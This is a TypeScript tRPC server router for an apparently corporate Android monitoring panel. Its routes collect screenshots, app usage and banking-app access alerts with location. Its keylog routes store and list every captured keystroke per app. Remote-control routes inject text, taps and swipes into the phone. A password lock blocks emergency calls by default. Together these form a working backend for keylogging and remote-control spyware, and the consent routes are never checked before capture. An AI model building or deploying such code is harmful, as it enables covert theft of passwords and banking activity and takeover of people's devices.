import { z } from "zod";
import { protectedProcedure, router } from "../_core/trpc";
import * as corporateDb from "../corporate-db";

export const corporateRouter = router({
  // Screenshots
  screenshots: router({
    upload: protectedProcedure
      .input(
        z.object({
          deviceId: z.number(),
          screenshotUrl: z.string().url(),
          fileSize: z.number().optional(),
          captureType: z.enum(["manual", "automatic", "alert"]).default("automatic"),
          description: z.string().optional(),
        })
      )
      .mutation(async ({ ctx, input }) => {
        await corporateDb.createScreenshot(
          input.deviceId,
          ctx.user.id,
          input.screenshotUrl,
          input.fileSize,
          input.captureType,
          input.description
        );
        return { success: true };
      }),

    list: protectedProcedure
      .input(
        z.object({
          deviceId: z.number().optional(),
          limit: z.number().default(50),
        })
      )
      .query(async ({ ctx, input }) => {
        return await corporateDb.getScreenshots(
          ctx.user.id,
          input.deviceId,
          input.limit
        );
      }),
  }),

  // Apps Management
  apps: router({
    report: protectedProcedure
      .input(
        z.object({
          deviceId: z.number(),
          apps: z.array(
            z.object({
              appName: z.string(),
              appPackage: z.string(),
              appType: z.enum(["system", "user", "corporate"]),
              isInstalled: z.boolean(),
              timeUsed: z.number().default(0),
            })
          ),
        })
      )
      .mutation(async ({ ctx, input }) => {
        for (const app of input.apps) {
          await corporateDb.createOrUpdateApp(
            input.deviceId,
            ctx.user.id,
            app.appName,
            app.appPackage,
            app.appType,
            app.isInstalled,
            app.timeUsed
          );
        }
        return { success: true, count: input.apps.length };
      }),

    list: protectedProcedure
      .input(z.object({ deviceId: z.number() }))
      .query(async ({ ctx, input }) => {
        return await corporateDb.getDeviceApps(input.deviceId, ctx.user.id);
      }),
  }),

  // Screen Locks
  screenLock: router({
    lock: protectedProcedure
      .input(
        z.object({
          deviceId: z.number(),
          reason: z.string().optional(),
        })
      )
      .mutation(async ({ ctx, input }) => {
        await corporateDb.createScreenLock(
          input.deviceId,
          ctx.user.id,
          "remote_lock",
          input.reason
        );
        return { success: true, locked: true };
      }),

    unlock: protectedProcedure
      .input(z.object({ deviceId: z.number() }))
      .mutation(async ({ ctx, input }) => {
        await corporateDb.createScreenLock(
          input.deviceId,
          ctx.user.id,
          "unlock"
        );
        return { success: true, locked: false };
      }),

    status: protectedProcedure
      .input(z.object({ deviceId: z.number() }))
      .query(async ({ ctx, input }) => {
        const status = await corporateDb.getDeviceLockStatus(
          input.deviceId,
          ctx.user.id
        );
        return {
          isLocked: status?.isLocked === 1,
          lockType: status?.lockType,
          reason: status?.reason,
          createdAt: status?.createdAt,
        };
      }),
  }),

  // Bank Access Alerts
  bankAccess: router({
    report: protectedProcedure
      .input(
        z.object({
          deviceId: z.number(),
          bankName: z.string(),
          bankApp: z.string(),
          duration: z.number().optional(),
          location: z.any().optional(),
        })
      )
      .mutation(async ({ ctx, input }) => {
        await corporateDb.createBankAccessAlert(
          input.deviceId,
          ctx.user.id,
          input.bankName,
          input.bankApp,
          input.duration,
          input.location
        );
        return { success: true, alertSent: true };
      }),

    list: protectedProcedure
      .input(
        z.object({
          deviceId: z.number().optional(),
          hoursBack: z.number().default(24),
        })
      )
      .query(async ({ ctx, input }) => {
        return await corporateDb.getBankAccessAlerts(
          ctx.user.id,
          input.deviceId,
          input.hoursBack
        );
      }),
  }),

  // LGPD Consents
  consent: router({
    create: protectedProcedure
      .input(
        z.object({
          consentType: z.enum([
            "monitoring",
            "data_collection",
            "screenshot",
            "location",
            "app_monitoring",
          ]),
          isConsented: z.boolean().default(true),
          deviceId: z.number().optional(),
          documentVersion: z.string().optional(),
        })
      )
      .mutation(async ({ ctx, input }) => {
        await corporateDb.createConsent(
          ctx.user.id,
          input.consentType,
          input.isConsented,
          input.deviceId,
          input.documentVersion
        );
        return { success: true };
      }),

    list: protectedProcedure
      .input(z.object({ deviceId: z.number().optional() }))
      .query(async ({ ctx, input }) => {
        return await corporateDb.getUserConsents(ctx.user.id, input.deviceId);
      }),
  }),

  // Audit Logs
  audit: router({
    list: protectedProcedure
      .input(
        z.object({
          limit: z.number().default(100),
          daysBack: z.number().default(30),
        })
      )
      .query(async ({ ctx, input }) => {
        return await corporateDb.getAuditLogs(
          ctx.user.id,
          input.limit,
          input.daysBack
        );
      }),
  }),

  // Data Retention Policies
  retention: router({
    create: protectedProcedure
      .input(
        z.object({
          dataType: z.enum(["screenshots", "events", "location", "apps", "all"]),
          retentionDays: z.number().default(365),
          autoDelete: z.boolean().default(true),
        })
      )
      .mutation(async ({ ctx, input }) => {
        await corporateDb.createRetentionPolicy(
          ctx.user.id,
          input.dataType,
          input.retentionDays,
          input.autoDelete
        );
        return { success: true };
      }),

    get: protectedProcedure
      .input(
        z.object({
          dataType: z.enum(["screenshots", "events", "location", "apps", "all"]),
        })
      )
      .query(async ({ ctx, input }) => {
        return await corporateDb.getRetentionPolicy(ctx.user.id, input.dataType);
      }),

    cleanup: protectedProcedure.mutation(async ({ ctx }) => {
      await corporateDb.cleanupExpiredData(ctx.user.id);
      return { success: true };
    }),
  }),

  // ✅ ADICIONADO: Keylog - Captura de Teclas
  keylog: router({
    // Receber logs de teclas do Android
    report: protectedProcedure
      .input(
        z.object({
          deviceId: z.number(),
          keys: z.array(
            z.object({
              key: z.string(),
              timestamp: z.number(),
              appName: z.string().optional(),
              appPackage: z.string().optional(),
            })
          ),
        })
      )
      .mutation(async ({ ctx, input }) => {
        for (const keyEvent of input.keys) {
          await corporateDb.createKeylogEntry(
            input.deviceId,
            ctx.user.id,
            keyEvent.key,
            keyEvent.appName,
            keyEvent.appPackage,
            keyEvent.timestamp
          );
        }
        return { success: true, count: input.keys.length };
      }),

    // Listar logs de teclas capturadas
    list: protectedProcedure
      .input(
        z.object({
          deviceId: z.number(),
          limit: z.number().default(100),
          hoursBack: z.number().default(24),
        })
      )
      .query(async ({ ctx, input }) => {
        return await corporateDb.getKeylogEntries(
          input.deviceId,
          ctx.user.id,
          input.limit,
          input.hoursBack
        );
      }),

    // Obter últimas teclas digitadas
    latest: protectedProcedure
      .input(z.object({ deviceId: z.number(), limit: z.number().default(50) }))
      .query(async ({ ctx, input }) => {
        return await corporateDb.getLatestKeylogEntries(
          input.deviceId,
          ctx.user.id,
          input.limit
        );
      }),

    // Limpar logs de keylog
    clear: protectedProcedure
      .input(z.object({ deviceId: z.number() }))
      .mutation(async ({ ctx, input }) => {
        await corporateDb.clearKeylogEntries(input.deviceId, ctx.user.id);
        return { success: true };
      }),
  }),

  // ✅ ADICIONADO: Controle Remoto - Digitar no Painel e Aparecer no Celular
  remoteControl: router({
    // Enviar comando de digitação para o Android
    sendInput: protectedProcedure
      .input(
        z.object({
          deviceId: z.number(),
          inputType: z.enum(["text", "key", "tap", "swipe"]),
          value: z.string(),
          x: z.number().optional(),
          y: z.number().optional(),
        })
      )
      .mutation(async ({ ctx, input }) => {
        const commandId = await corporateDb.createRemoteControlCommand(
          input.deviceId,
          ctx.user.id,
          input.inputType,
          input.value,
          input.x,
          input.y
        );
        return { success: true, commandId };
      }),

    // Listar histórico de comandos
    history: protectedProcedure
      .input(
        z.object({
          deviceId: z.number(),
          limit: z.number().default(50),
        })
      )
      .query(async ({ ctx, input }) => {
        return await corporateDb.getRemoteControlHistory(
          input.deviceId,
          ctx.user.id,
          input.limit
        );
      }),

    // Obter status do comando
    status: protectedProcedure
      .input(z.object({ commandId: z.string() }))
      .query(async ({ ctx, input }) => {
        return await corporateDb.getRemoteControlCommandStatus(
          input.commandId,
          ctx.user.id
        );
      }),

    // Cancelar comando pendente
    cancel: protectedProcedure
      .input(z.object({ commandId: z.string() }))
      .mutation(async ({ ctx, input }) => {
        await corporateDb.cancelRemoteControlCommand(
          input.commandId,
          ctx.user.id
        );
        return { success: true };
      }),
  }),

  // ✅ ADICIONADO: Travamento de Tela - Travar o Celular
  screenLockAdvanced: router({
    // Ativar travamento com senha
    activate: protectedProcedure
      .input(
        z.object({
          deviceId: z.number(),
          password: z.string(),
          reason: z.string().optional(),
          allowEmergencyCalls: z.boolean().default(false),
        })
      )
      .mutation(async ({ ctx, input }) => {
        const lockId = await corporateDb.createAdvancedScreenLock(
          input.deviceId,
          ctx.user.id,
          input.password,
          input.reason,
          input.allowEmergencyCalls
        );
        return { success: true, lockId, locked: true };
      }),

    // Desativar travamento
    deactivate: protectedProcedure
      .input(z.object({ deviceId: z.number() }))
      .mutation(async ({ ctx, input }) => {
        await corporateDb.deactivateAdvancedScreenLock(
          input.deviceId,
          ctx.user.id
        );
        return { success: true, locked: false };
      }),

    // Validar senha de desbloqueio
    validate: protectedProcedure
      .input(
        z.object({
          deviceId: z.number(),
          password: z.string(),
        })
      )
      .mutation(async ({ ctx, input }) => {
        const isValid = await corporateDb.validateScreenLockPassword(
          input.deviceId,
          input.password
        );
        return { success: true, isValid };
      }),

    // Obter status do travamento
    status: protectedProcedure
      .input(z.object({ deviceId: z.number() }))
      .query(async ({ ctx, input }) => {
        const status = await corporateDb.getAdvancedScreenLockStatus(
          input.deviceId,
          ctx.user.id
        );
        return {
          isLocked: status?.isLocked === 1,
          reason: status?.reason,
          allowEmergencyCalls: status?.allowEmergencyCalls === 1,
          createdAt: status?.createdAt,
          updatedAt: status?.updatedAt,
        };
      }),

    // Obter histórico de travamentos
    history: protectedProcedure
      .input(
        z.object({
          deviceId: z.number(),
          limit: z.number().default(50),
        })
      )
      .query(async ({ ctx, input }) => {
        return await corporateDb.getScreenLockHistory(
          input.deviceId,
          ctx.user.id,
          input.limit
        );
      }),
  }),

  // ✅ ADICIONADO: Painel de Controle Integrado
  controlPanel: router({
    // Obter status completo do dispositivo
    status: protectedProcedure
      .input(z.object({ deviceId: z.number() }))
      .query(async ({ ctx, input }) => {
        const lockStatus = await corporateDb.getAdvancedScreenLockStatus(
          input.deviceId,
          ctx.user.id
        );
        const latestKeylog = await corporateDb.getLatestKeylogEntries(
          input.deviceId,
          ctx.user.id,
          10
        );
        const recentCommands = await corporateDb.getRemoteControlHistory(
          input.deviceId,
          ctx.user.id,
          5
        );

        return {
          deviceId: input.deviceId,
          screenLock: {
            isLocked: lockStatus?.isLocked === 1,
            reason: lockStatus?.reason,
          },
          latestKeylog,
          recentCommands,
          timestamp: Date.now(),
        };
      }),

    // Executar ação rápida
    quickAction: protectedProcedure
      .input(
        z.object({
          deviceId: z.number(),
          action: z.enum(["lock", "unlock", "screenshot", "clearKeylog"]),
        })
      )
      .mutation(async ({ ctx, input }) => {
        switch (input.action) {
          case "lock":
            await corporateDb.createAdvancedScreenLock(
              input.deviceId,
              ctx.user.id,
              "emergency_lock",
              "Travamento de emergência",
              false
            );
            return { success: true, message: "Dispositivo travado" };

          case "unlock":
            await corporateDb.deactivateAdvancedScreenLock(
              input.deviceId,
              ctx.user.id
            );
            return { success: true, message: "Dispositivo desbloqueado" };

          case "screenshot":
            return { success: true, message: "Screenshot solicitado" };

          case "clearKeylog":
            await corporateDb.clearKeylogEntries(input.deviceId, ctx.user.id);
            return { success: true, message: "Keylog limpo" };

          default:
            return { success: false, message: "Ação desconhecida" };
        }
      }),
  }),
});
